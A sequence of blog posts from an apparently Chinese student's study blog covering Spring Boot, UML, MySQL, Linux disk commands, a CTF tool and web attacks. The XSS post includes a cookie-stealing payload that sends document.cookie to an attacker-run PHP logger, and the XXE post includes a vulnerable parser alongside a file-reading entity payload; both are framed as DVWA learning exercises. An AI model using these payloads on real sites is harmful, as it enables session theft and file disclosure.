<p><img src="https://s3.ax1x.com/2020/12/03/D7cMk9.jpg" alt="D7cMk9.jpg" style="zoom:80%;" /></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.example.demo11.Demo11Application;</span><br><span class="line"><span class="keyword">import</span> com.example.demo11.beans.User;</span><br><span class="line"><span class="keyword">import</span> com.example.demo11.dao.UserDao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringRunner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="meta">@SpringBootTest(classes = Demo11Application.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDaoTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">testInsertUser</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User(<span class="number">2021</span>,<span class="string">&quot;wangwu&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        userDao.insertUser(user);</span><br><span class="line">        System.out.println(user.getId());</span><br><span class="line">        System.out.println(<span class="string">&quot;---------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">testfindUser</span><span class="params">()</span>  <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        List&lt;User&gt; userList=userDao.findUser();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;userList.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(userList.get(i).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testfindUserById</span><span class="params">()</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        User user=userDao.findUserById(<span class="number">2</span>);</span><br><span class="line">        System.out.println(user.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>SpringBoot学习</category>
      </categories>
      <tags>
        <tag>SpringBoot学习</tag>
      </tags>
  </entry>
  <entry>
    <title>UML类图的关系</title>
    <url>/post/9a6cd09a.html</url>
    <content><![CDATA[<p>　　在软件开发的起始阶段，我们首先需要进行数据库设计，以下是管理类图的六种关系的解释。<span id="more"></span></p>
<h1 id="1-依赖（Dependence）"><a href="#1-依赖（Dependence）" class="headerlink" title="1 依赖（Dependence）"></a>1 依赖（Dependence）</h1><ul>
<li>【依赖关系】：是一种使用的关系，即一个类的实现需要另一个类来协助；</li>
<li>【代码表现】：局部变量、方法的参数或者对静态方法的调用；</li>
<li>【箭头和指向】：带箭头的虚线，指向被使用者；</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619491177-image-20210427103937640.png" alt="image-20210427103937640"></p>
<h1 id="2-关联（Association）"><a href="#2-关联（Association）" class="headerlink" title="2 关联（Association）"></a>2 关联（Association）</h1><ul>
<li>【关联关系】：是一种拥有的关系，它使一个类知道另一个类的属性和方法；如：老师与学生，丈夫与妻子关联可以是双向的，也可以是单向的。双向的关联可以有两个箭头或者没有箭头，单向的关联有一个箭头；</li>
<li>【代码体现】：成员变量；</li>
<li>【箭头及指向】：带普通箭头的实心线，指向被拥有者；</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619491290-image-20210427104130714.png" alt="image-20210427104130714"></p>
<h1 id="3-聚合（Aggregation）"><a href="#3-聚合（Aggregation）" class="headerlink" title="3 聚合（Aggregation）"></a>3 聚合（Aggregation）</h1><ul>
<li><p>【聚合关系】：是整体与部分的关系，且部分可以离开整体而单独存在。如车和轮胎是整体和部分的关系，轮胎离开车仍然可以存在；</p>
</li>
<li><ul>
<li>聚合关系是关联关系的一种，体现了一种“弱拥有”的概念。也就是说，对象A拥有对象B，但B并不是A的组成部分；</li>
<li>如果A由B聚合而成，则A包含B的全局对象，但B对象可以不在A对象创建时创建；</li>
<li>关联和聚合在语法上无法区分，必须考察具体的逻辑关系；</li>
</ul>
</li>
<li><p>【代码体现】：成员变量</p>
</li>
<li><p>【箭头及指向】：带空心菱形的实心线，菱形指向整体</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619491405-image-20210427104325334.png" alt="image-20210427104325334"></p>
<h1 id="4-组合（Composition）"><a href="#4-组合（Composition）" class="headerlink" title="4 组合（Composition）"></a>4 组合（Composition）</h1><ul>
<li><p>【组合关系】：是整体与部分的关系，但部分不能离开整体而单独存在。强调了比聚合关系更加强的整体/部分的关联，例如人和四肢。</p>
</li>
<li><ul>
<li>和聚合关系所不同的是:在组合关系中，虽然局部不一定随着整体的销毁而销毁，但整体要么负责保持局部的存活状态，要么负责将其销毁。也就是说，组合关系中，局部的存活期一定是小于，最多是等于整体的存活期的。</li>
</ul>
</li>
<li><p>【代码体现】：成员变量（一定是在构造函数中实现的）</p>
</li>
<li><p>【箭头及指向】：带实心菱形的实线，菱形指向整体</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619491464-image-20210427104424681.png" alt="image-20210427104424681"></p>
<h1 id="5-泛化（Generalization）"><a href="#5-泛化（Generalization）" class="headerlink" title="5 泛化（Generalization）"></a>5 泛化（Generalization）</h1><ul>
<li>【泛化关系】：表示为is-a的关系，是对象间耦合度最大的一种关系，它指定了子类如何特化父类的所有特征和行为。例如：老虎是动物的一种，即有老虎的特性也有动物的共性；</li>
<li>【箭头指向】：带三角箭头的实线，箭头指向父类；</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619491491-image-20210427104451457.png" alt="image-20210427104451457"></p>
<h1 id="6-实现（Realization）"><a href="#6-实现（Realization）" class="headerlink" title="6 实现（Realization）"></a>6 实现（Realization）</h1><ul>
<li>【实现关系】：是一种类与接口的关系，表示类是接口所有特征和行为的实现.</li>
<li>【箭头指向】：带三角箭头的虚线，箭头指向接口</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619491521-image-20210427104521600.png" alt="image-20210427104521600"></p>
]]></content>
      <tags>
        <tag>UML</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot注解</title>
    <url>/post/2f294b8e.html</url>
    <content><![CDATA[<p>　　在开发过程中经常用到的注解<span id="more"></span></p>
<h1 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h1><div class="table-container">
<table>
<thead>
<tr>
<th>注解</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>@Controller注解</td>
<td style="text-align:left">用于定义控制器类，在spring项目中由控制器负责将用户发来的URL请求转发到对应的服务接口（service层），一般这个注解在类中，通常方法需要配合注解@RequestMapping。</td>
</tr>
<tr>
<td>@RequestMapping注解</td>
<td style="text-align:left">@RequestMapping(“/path”)表示该控制器处理所有“/path”的UR L请求。RequestMapping是一个用来处理请求地址映射的注解，可用于类或方法上。</td>
</tr>
<tr>
<td>@ResponseBody注解</td>
<td style="text-align:left">直接写入HTTP response body中。比如异步获取json数据，加上@Responsebody后，会直接返回json数据。该注解一般会配合@RequestMapping一起使用。</td>
</tr>
<tr>
<td>@Conponent注解</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td>@ConfigurationProperties注解</td>
<td style="text-align:left">加入前缀区分properties文件获取的值</td>
</tr>
<tr>
<td>@Autowired注解</td>
<td style="text-align:left">注解导入。可以自动收集所有的Spring组件，包括@Configuration类。我们经常使用@ComponentScan注解搜索beans，并结合@Autowired注解导入。如果没有配置的话，Spring Boot会扫描启动类所在包下以及子包下的使用了@Service,@Repository等注解的类。</td>
</tr>
<tr>
<td>@Service注解</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td>@Mapper注解</td>
<td style="text-align:left">扫描DAO接口到Spring容器</td>
</tr>
<tr>
<td>@MapperScan注解</td>
<td style="text-align:left">开启扫描Mapper接口的包以及子目录</td>
</tr>
<tr>
<td>@Transactional注解</td>
<td style="text-align:left">事务管理器</td>
</tr>
<tr>
<td>@RestController注解</td>
<td style="text-align:left">相当于控制层类加上@Controller+方法上加@ResponseBody ，意味着当前控制层类中所有方法返还的都是JSON对象</td>
</tr>
<tr>
<td>@Bean注解</td>
<td style="text-align:left">主要在配置类中，相当于\<beans>\<bean id="" class="">\</beans></td>
</tr>
<tr>
<td></td>
<td style="text-align:left"></td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>SpringBoot框架</category>
      </categories>
      <tags>
        <tag>SpringBoot学习</tag>
      </tags>
  </entry>
  <entry>
    <title>cloacked-pixel艰难使用</title>
    <url>/post/387a909.html</url>
    <content><![CDATA[<p>python2下载安装，安装成功后，尝试使用<span id="more"></span></p>
<p><img src="https://s3.ax1x.com/2020/11/28/DyZcfU.jpg" alt="DyZcfU.jpg"></p>
<p>见到没有这个包</p>
<p>之后开始安装缺少的包</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">pip2 install numpy -i https:<span class="regexp">//</span>pypi.tuna.tsinghua.edu.cn<span class="regexp">/simple/</span></span><br></pre></td></tr></table></figure>
<p>[<img src="https://s3.ax1x.com/2020/11/28/DyZW6J.jpg" alt="DyZW6J.jpg"></p>
<p>最后终于能够成功使用，拿到flag</p>
<p><img src="https://s3.ax1x.com/2020/11/28/DyZ6YT.jpg" alt="DyZ6YT.jpg"></p>
]]></content>
      <categories>
        <category>第一届DMCTF夺旗赛</category>
      </categories>
      <tags>
        <tag>cloacked-pixel</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS攻击</title>
    <url>/post/4fa736d8.html</url>
    <content><![CDATA[<p>　　通过DVWA学习这个挺好<span id="more"></span></p>
<h1 id="XSS攻击概述"><a href="#XSS攻击概述" class="headerlink" title="XSS攻击概述"></a>XSS攻击概述</h1><p>　　XSS攻击又叫CSS（Cross Site Script），恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。</p>
<p>　　它和SQL注入攻击相似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而XSS攻击是通过插入恶意脚本，实现对用户浏览器的控制，获取用户信息。</p>
<p><img src="https://s3.ax1x.com/2021/01/14/sUIOVe.md.png" alt="sUIOVe.md.png"></p>
<h1 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害"></a>XSS危害</h1><ul>
<li>挂马</li>
</ul>
<ul>
<li>盗取用户Cookie。</li>
<li>DOS（拒绝服务）客户端浏览器。</li>
<li>钓鱼攻击，高级的钓鱼技巧。</li>
<li>删除目标文章、恶意篡改数据、嫁祸。</li>
<li>劫持用户Web行为，甚至进一步渗透内网。</li>
<li>爆发Web2.0蠕虫。</li>
<li>蠕虫式的DDoS攻击。</li>
<li>蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据等。</li>
</ul>
<h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> $_GET[<span class="string">&quot;uname&quot;</span>],</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>当用户访问<code>url?uname=&lt;script&gt;alert(&quot;hello&quot;);&lt;/script&gt;</code>时，触发代码，弹出对话框。</p>
<h2 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1.反射型"></a>1.反射型</h2><p>攻击者通过邮件等形式将包含XSS代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有XSS的代码发送给用户。用户浏览器解析执行代码，触发XSS漏洞。</p>
<p>只会执行一次，重复利用。</p>
<p>DVWA反射</p>
<p><code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></p>
<h2 id="2-存储型"><a href="#2-存储型" class="headerlink" title="2.存储型"></a>2.存储型</h2><p>攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性。</p>
<p>DVWA存储型</p>
<p>攻击者在论坛、博客、留言板中、发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库中。用户正常访问，触发XSS代码。</p>
<h2 id="3-DOMXSS"><a href="#3-DOMXSS" class="headerlink" title="3.DOMXSS"></a>3.DOMXSS</h2><p>全称Document Object Model</p>
<p>不需要服务器参与，触发XSS靠的是浏览器端的DOM解析，完全是客户端的事情。</p>
<p>不经过后端。这种类型是利用非法输入来闭合对应的html标签。如，a标签：<code>&lt;a href==&#39;$var&#39;&gt;&lt;/a&gt;</code>，当$var内容变为<code>’ οnclick=’alert(/xss/) //</code>这段代码就会被执行。</p>
<h1 id="反射型XSS实例"><a href="#反射型XSS实例" class="headerlink" title="反射型XSS实例"></a>反射型XSS实例</h1><p>Cookie在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式，保存在用户浏览器上（客户端）的小文本文件，包含有关用户信息。最典型的应用就是判定用户是否已经登录网站，用户可能会得到提示：是否下一次进入网站时保留用户信息以便简化登录手续。</p>
<p>DVWA</p>
<p>使用以下脚本文件</p>
<p>cookie.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cookie=$_GET(<span class="string">&#x27;cookie&#x27;</span>);</span><br><span class="line">file_put_contents(<span class="string">&#x27;cookie.txt&#x27;</span>,$cookie);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>注入</p>
<p><code>url?uname=&lt;script&gt;document.location=&#39;http://ip/xss_test/cookie/cookie.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></p>
<p>将链接发送到用户，用户点击即触发XSS漏洞，同时可以使用URL编码迷惑用户。</p>
]]></content>
      <categories>
        <category>网络安全知识学习</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE攻击</title>
    <url>/post/16c3837a.html</url>
    <content><![CDATA[<p>　　XML语言，还是不能够理解<span id="more"></span></p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>　　XXE攻击（XML External Entity），也就是<strong>XML外部实体注入漏洞</strong>。这个漏洞显然和XML有关。</p>
<p>假设有个应用有一个很简单的功能，html有个表单提交，如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">user</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">pass</span>&gt;</span>123<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务端接受该xml之后，将其中的用户名和密码解析出来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Username: &quot;</span>.$creds-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Password: &quot;</span>.$creds-&gt;pass;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZmVuZ3dlbmh1YS9JbWFnZUJlZC9yYXcvbWFzdGVyLzE1ODEwMDI1ODRfMjAyMDAyMDYyMzA0MzcyOTBfMjA2NjQxNzM4Mi5wbmc?x-oss-process=image/format,png" alt=""></p>
<p>如果给这个xml加上一段dtd，让xml解析我们引入的外部实体，这样，我们想读哪个文件，就读哪个文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;e:&#x2F;flag.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;login&gt;</span><br><span class="line">  &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">  &lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;login&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZmVuZ3dlbmh1YS9JbWFnZUJlZC9yYXcvbWFzdGVyLzE1ODEwMDI1ODVfMjAyMDAyMDYyMzE4NTgyNzFfMTE3MTM5OTk5MC5wbmc?x-oss-process=image/format,png" alt=""></p>
]]></content>
      <categories>
        <category>网络安全知识学习</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>java环境变量配置</title>
    <url>/post/a1cef01a.html</url>
    <content><![CDATA[<p>　　网上有很多java的配置，但是总结在这里，以后就不用再去搜索了<span id="more"></span></p>
<h1 id="1-下载安装jdk"><a href="#1-下载安装jdk" class="headerlink" title="1.下载安装jdk"></a>1.下载安装jdk</h1><p><a href="https://www.oracle.com/java/technologies/javase-downloads.html">https://www.oracle.com/java/technologies/javase-downloads.html</a></p>
<h1 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2.配置环境变量"></a>2.配置环境变量</h1><p>1.在电脑桌面 右键点击 “此电脑”的“属性”选项<!--more--></p>
<p><img src="https://s3.ax1x.com/2020/11/15/DityHH.jpg" alt="DityHH.jpg"></p>
<p>2.选择“高级系统设置”</p>
<p><img src="https://s3.ax1x.com/2020/11/15/DitruD.jpg" alt="DitruD.jpg" style="zoom:67%;" /></p>
<p>3.点击下面的“环境变量”</p>
<p><img src="https://s3.ax1x.com/2020/11/15/DitBjO.jpg" alt="DitBjO.jpg"></p>
<p>4.点击“系统变量”下面的”新建“选项</p>
<p><img src="https://s3.ax1x.com/2020/11/15/Dit24I.jpg" alt="Dit24I.jpg"></p>
<p>5.在”变量名“处填上”Java_Home“，在“变量值”文本框输入JDK的安装路径</p>
<p><img src="https://s3.ax1x.com/2020/11/15/DitgUA.jpg" alt="DitgUA.jpg"></p>
<p>6.在上一级“系统变量”中查看PATH变量，在“变量值”文本框的起始位置添加“%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;”</p>
<p><img src="https://s3.ax1x.com/2020/11/15/DitWCt.jpg" alt="DitWCt.jpg"></p>
<p>7.在上一级“系统变量”中查看CLASSPATH 变量，若无则新建变量CLASSPATH，在“变量值”文本框添加“.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;”</p>
<p><img src="https://s3.ax1x.com/2020/11/15/DitcEd.jpg" alt="DitcEd.jpg"></p>
<p>8.最后再dos命令窗口中输入javac</p>
<p><img src="https://s3.ax1x.com/2020/11/15/DitsDe.jpg" alt="DitsDe.jpg"></p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>linux磁盘管理</title>
    <url>/post/af2754a4.html</url>
    <content><![CDATA[<p>　　一些linux对磁盘管理的基本命令<span id="more"></span></p>
<h1 id="命令df和du"><a href="#命令df和du" class="headerlink" title="命令df和du"></a>命令df和du</h1><h2 id="1-命令df"><a href="#1-命令df" class="headerlink" title="1.命令df"></a>1.命令df</h2><p>df查看已挂载磁盘的总容量、使用容量、剩余容量等，可以不加任何参数，默认是k单位显示。</p>
<p><img src="https://s1.ax1x.com/2020/11/10/BqP9qH.jpg" alt="BqP9qH.jpg"></p>
<p>其中/、/boot是我们在安装系统时划分出来了。/dev、/dev/shm为内存分区，默认大小为内存大小的1/2，如果把文件存到这个分区，相当于存到了内存中，好处是读写非常快，坏处是系统重启文件就会丢失。/run、/sys/fs/cgroup等分区都是tmpfs，跟/dev/shm类似，为临时文件系统。</p>
<p>df常用的参数有-i -h -k -m等</p>
<p>-i 使用inodes显示结果</p>
<p>-h 使用合适的单位显示</p>
<p>-k -m分别是以k，m为单位显示</p>
<h2 id="2-命令du"><a href="#2-命令du" class="headerlink" title="2.命令du"></a>2.命令du</h2><p>用来查看某个目录或文件所占空间的大小，其格式为du [-abckmsh] [文件或者目录名] 常用的参数：</p>
<p>-a:全部文件与目录大小都列出来。如不加任何选项和参数只列出目录大小</p>
<p>-b:列出的值以bytes为单位输出，默认以Kbytes</p>
<p>-c:最后加总</p>
<p>-k:以KB为单位输出</p>
<p>-m:以MB为单位输出</p>
<p>-s:只列出总和</p>
<p>-h:系统自动调节单位，例如文件太小就以k为单位，太大就用G为单位</p>
<h1 id="磁盘的分区和格式化"><a href="#磁盘的分区和格式化" class="headerlink" title="磁盘的分区和格式化"></a>磁盘的分区和格式化</h1><p>fdisk linux下的硬盘分区工具，只能划分小于2TB的分区</p>
<p>fdisk [-l] [设备名字]</p>
<p>-l：后面不跟设备名会直接列出系统中所有的磁盘设备及分区表，加上设备名会列出该设备的分区表。</p>
<p><img src="https://s1.ax1x.com/2020/11/10/BqPPZd.jpg" alt="BqPPZd.jpg" style="zoom:67%;" /></p>
<p>如果不加-l就会进入另一个模式，在该模式下，可以对磁盘进行分区操作。</p>
<p>刚进入该模式下，会有一个提示Command (m for help): 此时按m则会打印出帮助列表，如果你英文好，我想你不难理解这些字母的功能。笔者常用的有p, n,d, w, q.</p>
<p><img src="https://s1.ax1x.com/2020/11/10/BqPpse.jpg" alt="BqPpse.jpg" style="zoom:67%;" /></p>
<p>P：打印当前磁盘的分区情况。</p>
<p>n：重新建立一个新的分区。</p>
<p>w：保存操作。</p>
<p>q：退出。</p>
<p>d：删除一个分区</p>
<h1 id="格式化磁盘分区"><a href="#格式化磁盘分区" class="headerlink" title="格式化磁盘分区"></a>格式化磁盘分区</h1><h2 id="1-命令mke2fs、mkfs-ext2、mkfs-ext3、mkfs-ext4和mkfs-xfs"><a href="#1-命令mke2fs、mkfs-ext2、mkfs-ext3、mkfs-ext4和mkfs-xfs" class="headerlink" title="1.命令mke2fs、mkfs.ext2、mkfs.ext3、mkfs.ext4和mkfs.xfs"></a>1.命令mke2fs、mkfs.ext2、mkfs.ext3、mkfs.ext4和mkfs.xfs</h2><p>前四个命令是一样的，以mkfs举例</p>
<p>mkfs [-t 文件系统格式] 装置文件名</p>
<p>-t可以接文件系统格式，例如ext3，ext2，vfat等（系统支持才会生效）</p>
]]></content>
      <categories>
        <category>linux学习</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql常用操作</title>
    <url>/post/38966ea9.html</url>
    <content><![CDATA[<p>　　关于mysql数据库的一些常用语句<span id="more"></span></p>
<h1 id="1-数据库"><a href="#1-数据库" class="headerlink" title="1.数据库"></a>1.数据库</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看所有的数据库</span><br><span class="line">SHOW DATABASES ;</span><br><span class="line"># 创建一个数据库</span><br><span class="line">CREATE DATABASE k;</span><br><span class="line"># 删除一个数据库</span><br><span class="line">DROP DATABASE k;</span><br><span class="line"># 使用这个数据库</span><br><span class="line">USE k;</span><br></pre></td></tr></table></figure>
<h1 id="2-表"><a href="#2-表" class="headerlink" title="2.表"></a>2.表</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看所有的表</span><br><span class="line">SHOW TABLES ;</span><br><span class="line"># 创建一个表</span><br><span class="line">CREATE TABLE n(id INT, name VARCHAR(10));</span><br><span class="line">CREATE TABLE m(id INT, name VARCHAR(10), PRIMARY KEY (id), FOREIGN KEY (id) REFERENCES n(id), UNIQUE (name));</span><br><span class="line">CREATE TABLE m(id INT, name VARCHAR(10));</span><br><span class="line"># 直接将查询结果导入或复制到新创建的表</span><br><span class="line">CREATE TABLE n SELECT * FROM m;</span><br><span class="line"># 新创建的表与一个存在的表的数据结构类似</span><br><span class="line">CREATE TABLE m LIKE n;</span><br><span class="line"># 创建一个临时表</span><br><span class="line"># 临时表将在你连接MySQL期间存在。当断开连接时，MySQL将自动删除表并释放所用的空间。也可手动删除。</span><br><span class="line">CREATE TEMPORARY TABLE l(id INT, name VARCHAR(10));</span><br><span class="line"># 直接将查询结果导入或复制到新创建的临时表</span><br><span class="line">CREATE TEMPORARY TABLE tt SELECT * FROM n;</span><br><span class="line"># 删除一个存在表</span><br><span class="line">DROP TABLE IF EXISTS m;</span><br><span class="line"># 更改存在表的名称</span><br><span class="line">ALTER TABLE n RENAME m;</span><br><span class="line">RENAME TABLE n TO m;</span><br><span class="line"># 查看表的结构(以下五条语句效果相同）</span><br><span class="line">DESC n;   # 因为简单，所以建议使用</span><br><span class="line">DESCRIBE n;</span><br><span class="line">SHOW COLUMNS IN n;</span><br><span class="line">SHOW COLUMNS FROM n;</span><br><span class="line">EXPLAIN n;</span><br><span class="line"># 查看表的创建语句</span><br><span class="line">SHOW CREATE TABLE n;</span><br></pre></td></tr></table></figure>
<h2 id="2-1表的结构"><a href="#2-1表的结构" class="headerlink" title="2.1表的结构"></a>2.1表的结构</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#添加字段</span><br><span class="line">alter table n add age varchar(2);</span><br><span class="line">#删除字段</span><br><span class="line">alter table n drop age;</span><br><span class="line">#更改字段属性和属性</span><br><span class="line">alter table n change age a int;</span><br><span class="line">#只更改字段属性</span><br><span class="line">alter table n modify age varchar(7)</span><br><span class="line">#已有字段设置默认值</span><br><span class="line">alter table n add column_name drop default;#若已有默认值，先删除</span><br><span class="line">alter table n alter column column_name set default(x);</span><br></pre></td></tr></table></figure>
<h2 id="2-2表的数据"><a href="#2-2表的数据" class="headerlink" title="2.2表的数据"></a>2.2表的数据</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#增加数据</span><br><span class="line">insert into n values (1,&#39;tom&#39;,&#39;23&#39;),(2,&#39;johin&#39;,&#39;22&#39;)</span><br><span class="line">inster into n select * from n;</span><br><span class="line">#删除数据</span><br><span class="line">delete from n where id &#x3D; 2;</span><br><span class="line">#更改数据</span><br><span class="line">update n set name &#x3D; &#39;tom&#39; where id &#x3D; 2;</span><br><span class="line">#数据查找</span><br><span class="line">select * from n where name like &#39;%h%&#39;;</span><br><span class="line">#数据排序（反序）</span><br><span class="line">select * from n order by name, id desc;</span><br></pre></td></tr></table></figure>
<h1 id="3-键"><a href="#3-键" class="headerlink" title="3.键"></a>3.键</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#添加主键</span><br><span class="line">alter table n add primary key (id);</span><br><span class="line">alter table n add constraint pk_n primary key (id);</span><br><span class="line">#删除主键</span><br><span class="line">alter table n drop primary key;</span><br><span class="line">#添加外键</span><br><span class="line">alter table m add foreign key (id) references n (id)#自动生成键名m_ibfk_1</span><br><span class="line">ALTER TABLE m ADD CONSTRAINT fk_id FOREIGN KEY (id) REFERENCES n(id);   # 使用定义的键名fk_id</span><br><span class="line">#删除外键</span><br><span class="line">alter table m drop foreign key &#39;fk_id&#39;</span><br><span class="line">#修改外键</span><br><span class="line">ALTER TABLE m DROP FOREIGN KEY &#96;fk_id&#96;, ADD CONSTRAINT fk_id2 FOREIGN KEY (id) REFERENCES n(id);    # 删除之后从新建</span><br><span class="line">#添加唯一键</span><br><span class="line">ALTER TABLE n ADD UNIQUE (name);</span><br><span class="line">ALTER TABLE n ADD UNIQUE u_name (name);</span><br><span class="line">ALTER TABLE n ADD UNIQUE INDEX u_name (name);</span><br><span class="line">ALTER TABLE n ADD CONSTRAINT u_name UNIQUE (name);</span><br><span class="line">CREATE UNIQUE INDEX u_name ON n(name);</span><br><span class="line"># 添加索引</span><br><span class="line">ALTER TABLE n ADD INDEX (age);</span><br><span class="line">ALTER TABLE n ADD INDEX i_age (age);</span><br><span class="line">CREATE INDEX i_age ON n(age);</span><br><span class="line"># 删除索引或唯一键</span><br><span class="line">DROP INDEX u_name ON n;</span><br><span class="line">DROP INDEX i_age ON n;</span><br></pre></td></tr></table></figure>
